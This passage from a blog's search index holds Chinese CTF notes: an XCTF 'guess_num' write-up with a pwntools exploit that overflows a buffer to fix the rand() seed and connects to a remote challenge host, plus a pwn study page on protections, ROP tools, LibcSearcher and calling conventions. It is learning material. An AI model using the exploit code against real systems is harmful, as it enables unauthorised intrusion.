            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>guess_num_wp</title>
      <link href="pwn/guess-num-wp/guess-num-wp/"/>
      <url>pwn/guess-num-wp/guess-num-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="xctf-guess-num-WP"><a href="#xctf-guess-num-WP" class="headerlink" title="xctf_guess_num WP"></a>xctf_guess_num WP</h1><a id="more"></a><h3 id="查文件"><a href="#查文件" class="headerlink" title="查文件"></a>查文件</h3><p>64位exb</p><p>保护全开</p><p><img src="/../images/guess-num-wp/image-20200317174455644.png" alt="image-20200317174455644"></p><!--more--><h3 id="ida-分析"><a href="#ida-分析" class="headerlink" title="ida 分析"></a>ida 分析</h3><p>ida里的吧</p><p><img src="/../images/guess-num-wp/image-20200317174518780.png" alt="image-20200317174518780"></p><p><img src="/../images/guess-num-wp/image-20200317174557409.png" alt="image-20200317174557409"></p><p>反汇编后可以看到程序利用了随机数函数生成number</p><p>srand（） 为 rand（）的发生器</p><p><img src="/../images/guess-num-wp/image-20200317174627455.png" alt="image-20200317174627455"></p><p>从这里可以得到seed参数</p><p>进入函数内部看到</p><p><img src="/../images/guess-num-wp/image-20200317174703813.png" alt="image-20200317174703813"></p><p>得出了 result 函数返回值  = buf = urandom-&gt; fd</p><p>调用的文件给了提示</p><!--qword 类型为 无符号的整型（0~2^64 - 1)--><p>think_1:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用缓冲区溢出修改seed值，固定</span><br><span class="line">但从反汇编代码看程序需要循环<span class="number">10</span>次才能正常退出循环</span><br><span class="line">漏洞函数sub_C3E()再循环体外</span><br></pre></td></tr></table></figure><p>think_2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跳过循环体  无法执行， 程序保护开满</span><br></pre></td></tr></table></figure><p>漏洞函数：</p><p><img src="/../images/guess-num-wp/image-20200317174718651.png" alt="image-20200317174718651"></p><p>c99 scanf函数</p><p><img src="/../images/guess-num-wp/image-20200317174730510.png" alt="image-20200317174730510"></p><p>看大佬wp得到</p><p>固定种子 ， 测试得到答案</p><p><img src="/../images/guess-num-wp/image-20200317174743470.png" alt="image-20200317174743470">gets参数和seed 偏移量为 0x20</p><p>构造</p><p>payload = ‘a’ *0x20 + p64(1)    <!--缓冲区溢出--></p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">最后通过加载linux内函数库调用rand函数，实现伪随机数的再实现并发送到环境内, p64(<span class="number">1</span>)为调用函数后的返回地址,</span><br><span class="line">但有时会重复利用漏洞函数，就需要用漏洞函数所在的地址来做<span class="keyword">call</span> <span class="function"><span class="keyword">function</span></span> 后的返回地址</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">r = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'44179'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>) </span><br><span class="line">r.sendlineafter(<span class="string">'Your name:'</span>,payload)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):  <span class="comment">#use python write a script</span></span><br><span class="line">num = str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">r.sendline(num)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN</title>
      <link href="pwn/pwn/"/>
      <url>pwn/pwn/</url>
      
        <content type="html"><![CDATA[<!--this page will often renew --><a id="more"></a><h2 id="32-bit-depend"><a href="#32-bit-depend" class="headerlink" title="32 bit_depend"></a>32 bit_depend</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">32位程序不能直接在64位linux下安装, 需要安装32位依赖:</span><br><span class="line">$ sudo apt-get install ia32-libs</span><br><span class="line">无法安装，找不到库，就用下面这个方法打开多架构支持，然后更新</span><br><span class="line"></span><br><span class="line">$ sudo dpkg –add-architecture i386</span><br><span class="line"></span><br><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install ia32-libs</span><br><span class="line"></span><br><span class="line">如果没有ia32-libs就用</span><br><span class="line"></span><br><span class="line">$ sudo dpkg –add-architecture i386</span><br><span class="line"></span><br><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line">$ sudo apt-get upgrade</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install lib32ncurses5 lib32z1</span><br><span class="line"></span><br><span class="line">安装pwntools的过程中如果出错的话用这句话</span><br><span class="line">sudo apt-get install build-essential libssl-dev libffi-dev python-dev</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><h3 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a><strong>NX保护</strong></h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> 数据段上指令无法执行</span><br><span class="line">数据执行保护(NX/DEP)  NX即No-eXcute(不可执行) ,当程序溢出成功转入shellcode时，程序会尝试在</span><br><span class="line">数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</span><br><span class="line">绕过方法<span class="symbol">:ROP</span></span><br><span class="line">让攻击者难以找到shellcode地址</span><br></pre></td></tr></table></figure><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  地址空间布局随机化（<span class="keyword">address </span><span class="meta">space</span> layout randomization)</span><br><span class="line">绕过方法: <span class="meta">info</span> leak . ret2dirsolve . ROP</span><br><span class="line">检测Stack Overflow</span><br><span class="line">stack canary/cookie</span><br><span class="line">绕过方法:infoleak</span><br><span class="line">现在NX+Stack Canary + ASLR基本是标配</span><br></pre></td></tr></table></figure><h3 id="绕过stack-canary"><a href="#绕过stack-canary" class="headerlink" title="绕过stack canary :"></a>绕过stack canary :</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">通常通过在栈中插入cookie信息（一般在ebp(栈底)上方），在函数返回的时候检查cookie是否改变，</span><br><span class="line">如果改变则认为栈结构被破坏，则调用一个函数强制停止程序。</span><br><span class="line">当开启Canary保护的时候不能通过传统的栈溢出直接覆盖返回值劫持EIP</span><br></pre></td></tr></table></figure><p>solve：    Leak Canary   : 通过printf 的泄露, Canary 一般从00 开始</p><p>​    ····Overwrite Canary<br>​    </p><h3 id="Linux-kernel-保护机制"><a href="#Linux-kernel-保护机制" class="headerlink" title="Linux kernel 保护机制"></a>Linux kernel 保护机制</h3><h3 id="Fortify保护"><a href="#Fortify保护" class="headerlink" title="Fortify保护"></a>Fortify保护</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#### （一种增强保护机制，防止缓冲区溢出攻击，会替换诸如memcpy、memset、strcpy等危险函数）。</span><br></pre></td></tr></table></figure><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">精度glibc内存管理ptmalloc源代码分析.pdf  先通读,再用作工具书 精读</span><br><span class="line"></span><br><span class="line">上书<span class="number">1</span>~<span class="number">27</span> 页 , 粗度<span class="number">28</span> ~ <span class="number">130</span> 页  <span class="meta">area</span>, <span class="keyword">bin, </span>chunk . Know <span class="keyword">it </span><span class="keyword">and </span>pwn <span class="keyword">it</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">通用防护 </span>ASLR , DEP</span><br></pre></td></tr></table></figure><h2 id="gdb插件-控制-pwndbg-peda-gef-切换"><a href="#gdb插件-控制-pwndbg-peda-gef-切换" class="headerlink" title="gdb插件, 控制 pwndbg, peda, gef 切换"></a>gdb插件, 控制 pwndbg, peda, gef 切换</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">function</span> Mode_change &#123;</span><br><span class="line">    name=<span class="variable">$1</span></span><br><span class="line">    gdbinitfile=~/.gdbinit    <span class="comment">#按照实际情况修改</span></span><br><span class="line">    gdbinitfile=/root/Desktop/mode</span><br></pre></td></tr></table></figure><pre><code>peda=&quot;source ~/peda/peda.py&quot;   #这个路径按照你的实际情况修改gef=&quot;source ~/.gdbinit-gef.py&quot;   #这个路径按照你的实际情况修改pwndbg=&quot;source /opt/pwndbg/gdbinit.py&quot;   #这个路径按照你的实际情况修改sign=$(cat $gdbinitfile | grep -n &quot;#this place is controled by user&apos;s shell&quot;)            #此处上面的查找内容要和你自己的保持一致pattern=&quot;:#this place is controled by user&apos;s shell&quot;number=${sign%$pattern}location=$[number+2]parameter_add=${location}iparameter_del=${location}dmessage=&quot;TEST&quot;if [ $name -eq &quot;1&quot; ];then    sed -i &quot;$parameter_del&quot; $gdbinitfile    sed -i &quot;$parameter_add $peda&quot; $gdbinitfile    echo -e &quot;Please enjoy the peda!\n&quot;elif [ $name -eq &quot;2&quot; ];then    sed -i &quot;$parameter_del&quot; $gdbinitfile    sed -i &quot;$parameter_add $gef&quot; $gdbinitfile    echo -e &quot;Please enjoy the gef!\n&quot;else    sed -i &quot;$parameter_del&quot; $gdbinitfile    sed -i &quot;$parameter_add $pwndbg&quot; $gdbinitfile    echo -e &quot;Please enjoy the pwndbg!\n&quot;fi}echo -e &quot;Please choose one mode of GDB?\n1.peda    2.gef    3.pwndbg&quot;read -p &quot;Input your choice:&quot; numif [ $num -eq &quot;1&quot; ];then    Mode_change $numelif [ $num -eq &quot;2&quot; ];then    Mode_change $numelif [ $num -eq &quot;3&quot; ];then    Mode_change $numelse    echo -e &quot;Error!\nPleasse input right number!&quot;figdb $1 $2 $3 $4 $5 $6 $7 $8 $9 --&gt; </code></pre><ul><li><a href="https://www.jianshu.com/p/94a71af2022a" target="_blank" rel="noopener">脚本转自他人简书博客</a></li></ul><h3 id="peda"><a href="#peda" class="headerlink" title="peda:"></a>peda:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">aslr -- Show&#x2F;set ASLR setting of GDB</span><br><span class="line">checksec -- Check for various security options of binary</span><br><span class="line">dumpargs -- Display arguments passed to a function when stopped at a call instruction</span><br><span class="line">dumprop -- Dump all ROP gadgets in specific memory range</span><br><span class="line">elfheader -- Get headers information from debugged ELF file</span><br><span class="line">可以获取.plt位置</span><br><span class="line">elfsymbol -- Get non-debugging symbol information from an ELF file</span><br><span class="line">lookup -- Search for all addresses&#x2F;references to addresses which belong to a memory range</span><br><span class="line">patch -- Patch memory start at an address with string&#x2F;hexstring&#x2F;int</span><br><span class="line">pattern -- Generate, search, or write a cyclic pattern to memory</span><br><span class="line">pattern offset value 定位字符串</span><br><span class="line">procinfo -- Display various info from &#x2F;proc&#x2F;pid&#x2F;</span><br><span class="line">pshow -- Show various PEDA options and other settings</span><br><span class="line">pset -- Set various PEDA options and other settings</span><br><span class="line">readelf -- Get headers information from an ELF file</span><br><span class="line">ropgadget -- Get common ROP gadgets of binary or library</span><br><span class="line">ropsearch -- Search for ROP gadgets in memory</span><br><span class="line">searchmem|find -- Search for a pattern in memory; support regex search</span><br><span class="line">find &quot;&#x2F;bin&#x2F;bash&#x2F;&quot; libc</span><br><span class="line">shellcode -- Generate or download common shellcodes.</span><br><span class="line">skeleton -- Generate python exploit code template</span><br><span class="line">vmmap -- Get virtual mapping address ranges of section(s) in debugged process</span><br><span class="line">xormem -- XOR a memory region with a key</span><br></pre></td></tr></table></figure><h3 id="gef"><a href="#gef" class="headerlink" title="gef"></a>gef</h3><p>heap 模块为堆利用神器 ，所以翻了翻goole  找到了最终的下载</p><!--wget 连接实在不好用--><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone http://www.github.<span class="keyword">com</span>/hugsy/gef</span><br><span class="line"><span class="keyword">cd</span> gef</span><br><span class="line">gef/ # <span class="keyword">echo</span> <span class="keyword">source</span> gef.<span class="keyword">py</span> &gt;&gt;~/.gdbinit</span><br></pre></td></tr></table></figure><h3 id="dbg"><a href="#dbg" class="headerlink" title="dbg"></a>dbg</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">break </span>*<span class="keyword">address</span></span><br><span class="line"><span class="keyword">c </span>单步走</span><br></pre></td></tr></table></figure><h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> pip install ropgadget</span><br><span class="line"> ROPgadget:</span><br><span class="line"> usage: ROPgadget.py [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]</span><br><span class="line">                    [--string &lt;string&gt;] [--memstr &lt;string&gt;] [--depth &lt;nbyte&gt;]</span><br><span class="line">                    [--only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]</span><br><span class="line">                    [--badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]</span><br><span class="line">                    [--rawEndian &lt;endian&gt;] [--re &lt;re&gt;] [--offset &lt;hexaddr&gt;]</span><br><span class="line">                    [--ropchain] [--thumb] [--console] [--norop] [--nojop]</span><br><span class="line">                    [--callPreceded] [--nosys] [--multibr] [--all] [--noinstr]</span><br><span class="line">                    [--dump]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">    -h, --help           show this help message <span class="keyword">and</span> exit</span><br><span class="line">    -v, --version        Display the ROPgadget<span class="string">'s version</span></span><br><span class="line"><span class="string">    -c, --checkUpdate    Checks if a new version is available</span></span><br><span class="line"><span class="string">    --binary &lt;binary&gt;    Specify a binary filename to analyze</span></span><br><span class="line"><span class="string">    --opcode &lt;opcodes&gt;   Search opcode in executable segment</span></span><br><span class="line"><span class="string">    --string &lt;string&gt;    Search string in readable segment</span></span><br><span class="line"><span class="string">    --memstr &lt;string&gt;    Search each byte in all readable segment</span></span><br><span class="line"><span class="string">    --depth &lt;nbyte&gt;      Depth for search engine (default 10)</span></span><br><span class="line"><span class="string">    --only &lt;key&gt;         Only show specific instructions</span></span><br><span class="line"><span class="string">    --filter &lt;key&gt;       Suppress specific instructions</span></span><br><span class="line"><span class="string">    --range &lt;start-end&gt;  Search between two addresses (0x...-0x...)</span></span><br><span class="line"><span class="string">    --badbytes &lt;byte&gt;    Rejects specific bytes in the gadget'</span>s address</span><br><span class="line">    --rawArch &lt;arch&gt;     Specify an arch <span class="keyword">for</span> a<span class="built_in"> raw </span>file</span><br><span class="line">    --rawMode &lt;mode&gt;     Specify a mode <span class="keyword">for</span> a<span class="built_in"> raw </span>file</span><br><span class="line">    --rawEndian &lt;endian&gt; Specify an endianness <span class="keyword">for</span> a<span class="built_in"> raw </span>file</span><br><span class="line">    --offset &lt;hexaddr&gt;   Specify an offset <span class="keyword">for</span> gadget addresses</span><br><span class="line">    --ropchain           <span class="builtin-name">Enable</span> the ROP chain generation</span><br><span class="line">    --thumb              Use the thumb mode <span class="keyword">for</span> the search engine (ARM only)</span><br><span class="line">    --console            Use an interactive<span class="built_in"> console </span><span class="keyword">for</span> search engine</span><br><span class="line">    --norop              <span class="builtin-name">Disable</span> ROP search engine</span><br><span class="line">    --nojop              <span class="builtin-name">Disable</span> JOP search engine</span><br><span class="line">    --callPreceded       Only show gadgets which are call-preceded</span><br><span class="line">    --nosys              <span class="builtin-name">Disable</span> SYS search engine</span><br><span class="line">    --multibr            <span class="builtin-name">Enable</span> multiple branch gadgets</span><br><span class="line">    --all                Disables the removal of duplicate gadgets</span><br><span class="line">    --noinstr            <span class="builtin-name">Disable</span> the gadget instructions<span class="built_in"> console </span>printing</span><br><span class="line">    --dump   Outputs the gadget bytes [LibcSearche]</span><br></pre></td></tr></table></figure><h2 id="用来寻找libc-版本的工具"><a href="#用来寻找libc-版本的工具" class="headerlink" title="用来寻找libc 版本的工具"></a><a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">用来寻找libc 版本的工具</a></h2><h3 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line"><span class="built_in">cd</span> LibcSearcher</span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第二个参数，为已泄露的实际地址,或最后<span class="number">12</span>位(比如：d90)，int类型</span><br><span class="line">obj = LibcSearcher(<span class="string">"fgets"</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">"system"</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">"str_bin_sh"</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">"__libc_start_main_ret"</span>)</span><br></pre></td></tr></table></figure><h2 id="pwndocker"><a href="#pwndocker" class="headerlink" title="pwndocker"></a><a href="https://github.com/0xTac/Pwndocker" target="_blank" rel="noopener">pwndocker</a></h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone <span class="symbol">https:</span>/<span class="regexp">/github.com/</span>TacXingXing/Pwndocker</span><br><span class="line">cd Pwndocker</span><br><span class="line">docker build -t pwndocker .</span><br><span class="line">docker run -it -v -v <span class="variable">$(</span>pwd)/<span class="variable">$&#123;</span>ctf_name&#125;<span class="symbol">:/ctf/work</span> -p <span class="number">23946:23946</span> --privileged --cap-add=SYS_PRTACE pwndocker</span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">included software</span><br><span class="line">pwntools —— CTF framework <span class="keyword">and</span> exploit development library</span><br><span class="line">pwndbg —— a GDB plug-in that makes debugging with GDB suck less, with a focus on features needed by low-level software developers,<span class="built_in"> hardware </span>hackers, reverse-engineers <span class="keyword">and</span> exploit developers</span><br><span class="line">pwngdb —— gdb <span class="keyword">for</span> pwn</span><br><span class="line">ROPgadget —— facilitate ROP exploitation tool</span><br><span class="line">roputils —— A Return-oriented Programming toolkit</span><br><span class="line">one_gadget —— A searching one-gadget of execve(<span class="string">'/bin/sh'</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>)<span class="built_in"> tool </span><span class="keyword">for</span> amd64 <span class="keyword">and</span> i386</span><br><span class="line">angr —— A platform-agnostic binary analysis framework</span><br><span class="line">radare2 —— A rewrite <span class="keyword">from</span> scratch of radare <span class="keyword">in</span> order <span class="keyword">to</span> provide a <span class="builtin-name">set</span> of libraries <span class="keyword">and</span> tools <span class="keyword">to</span> work with binary files</span><br><span class="line">welpwn —— designed <span class="keyword">to</span> make pwnning an art, freeing you <span class="keyword">from</span> dozens of meaningless jobs.</span><br><span class="line">linux_server[64] —— IDA 7.0 <span class="builtin-name">debug</span><span class="built_in"> server </span><span class="keyword">for</span> linux</span><br><span class="line">tmux —— a terminal multiplexer</span><br><span class="line">ltrace —— trace library function call</span><br><span class="line">strace —— trace<span class="built_in"> system </span>call</span><br><span class="line">added softwares</span><br><span class="line">zsh &amp;&amp; oh-my-zsh -- A delightful community-driven (with 1,300+ contributors) framework <span class="keyword">for</span> managing your zsh configuration.</span><br><span class="line">peda -- Python Exploit Development Assistance <span class="keyword">for</span> GDB</span><br><span class="line">socat -- A relay <span class="keyword">for</span> bidirectional data transfer between two independent data channels.</span><br><span class="line">z3 -- Theorem Prover</span><br><span class="line">seccomp-tools -- Provide powerful tools <span class="keyword">for</span> seccomp analysis</span><br><span class="line">qemu -- QEMU is a generic <span class="keyword">and</span> open source machine emulator <span class="keyword">and</span> virtualizer. .gdbinit .zshrc .tmux.conf</span><br></pre></td></tr></table></figure><p><img src="/images/pwn/image-20200317174124303.png" alt="image-20200317174124303"></p><h2 id="x64与x86架构函数原理"><a href="#x64与x86架构函数原理" class="headerlink" title="x64与x86架构函数原理"></a>x64与x86架构函数原理</h2><h3 id="对齐约定"><a href="#对齐约定" class="headerlink" title="对齐约定"></a>对齐约定</h3><pre><code>x64的调用约定中，大部分情况下默认是16字节对齐的，gcc编译时分配数组是也会进行16字节对齐但是栈溢出后我们破坏掉了这个对齐，导致了这个错误 x64之rop:  开始的位置由数据填充构成 ;   通过所给的libc.so文件计算函数之间的偏移地址, 即地址差, 从而得到需要覆盖的字节数,</code></pre><h3 id="函数调用约定-c-c"><a href="#函数调用约定-c-c" class="headerlink" title="  函数调用约定(c/c++):"></a><a href="https://blog.csdn.net/hellokandy/article/details/54603055" target="_blank" rel="noopener">  函数调用约定(c/c++)</a>:</h3><pre><code>VC中默认调用是 __cdecl 方式，Windows API 使用 __stdcall 调用方式，在 DLL 导出函数中，为了跟 Windows API 保持一致，建议使用 __stdcall 方式。</code></pre><h4 id="stdcall"><a href="#stdcall" class="headerlink" title="stdcall"></a>stdcall</h4><pre><code>__stdcall 是 StandardCall 的缩写，是C++的标准调用方式。stdcall 调用方式又被称为 Pascal 调用方式。在Microsoft C++系列的C/C++编译器中，使用 PASCAL 宏，WINAPI 宏和 CALLBACK 宏来指定函数的调用方式为 stdcall。其声明语法为：int _stdcall function(int a, int b);stdcall的调用方式意味着：（1）参数从右向左依次压入堆栈.（2）由被调用函数自己来恢复堆栈，称为自动清栈。（3）函数名自动加前导下划线，后面紧跟着一个@，其后紧跟着参数的大小。</code></pre><h4 id="cdecl"><a href="#cdecl" class="headerlink" title="cdecl"></a>cdecl</h4><pre><code>__cdecl 是C Declaration的缩写（declaration，声明），cdecl调用方式又称为C调用方式，是C语言缺省的调用方式。其声明语法为：int function(int a, int b) // 不加修饰符就是C调用方式int _cdecl function(int a, int b) // 明确指定用C调用方式 cdecl的调用方式意味着：（1）参数从右向左依次压入堆栈.（2）由调用者恢复堆栈，称为手动清栈。（3）函数名自动加前导下划线。</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="fastcall"><a href="#fastcall" class="headerlink" title="fastcall"></a><strong>fastcall</strong></h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fastcall 按照名字上理解就可以知道，它是一种快速调用方式，因为它通过 <span class="meta">CPU</span> 寄存器来传递参数。</span><br><span class="line">此方式的函数的第一个和第二个<span class="built_in">DWORD</span>参数通过<span class="built_in">ecx</span>和<span class="built_in">edx</span>传递，后面的参数从右向左的顺序压入栈。被调用函数清理堆栈。</span><br><span class="line">其声明语法为：</span><br><span class="line"><span class="keyword">int</span> fastcall function(<span class="keyword">int</span> a, <span class="keyword">int</span> b)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h4 id="thiscall"><a href="#thiscall" class="headerlink" title="thiscall"></a>thiscall</h4><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">thiscall 调用方式是唯一一种不能显示指定的修饰符。它是C++类成员函数缺省的调用方式。由于成员函数调用还有一个<span class="keyword">this</span>指针，因此必须用这种特殊的调用方式。</span><br><span class="line">thiscall调用方式意味着：（<span class="number">1</span>）参数从右向左压入栈。</span><br><span class="line">（<span class="number">2</span>）如果参数个数确定，<span class="keyword">this</span>指针通过ecx传递给被调用者；如果参数个数不确定，<span class="keyword">this</span>指针在所有参数压入栈后被压入栈。</span><br><span class="line">参数个数不定的，由调用者清理堆栈，否则由函数自己清理堆栈。可以看到，对于参数个数固定的情况，它类似于stdcall，不定时则类似于cdecl。 fastcall</span><br></pre></td></tr></table></figure><h4 id="naked-call"><a href="#naked-call" class="headerlink" title="naked call"></a>naked call</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">是一种比较少见的调用方式，一般高级程序设计语言中不常见。</span><br><span class="line">函数的声明调用方式和实际调用方式必须一致，否则编译器会产生混乱。</span><br></pre></td></tr></table></figure><h2 id="漏洞利用技术与技巧"><a href="#漏洞利用技术与技巧" class="headerlink" title="漏洞利用技术与技巧"></a>漏洞利用技术与技巧</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 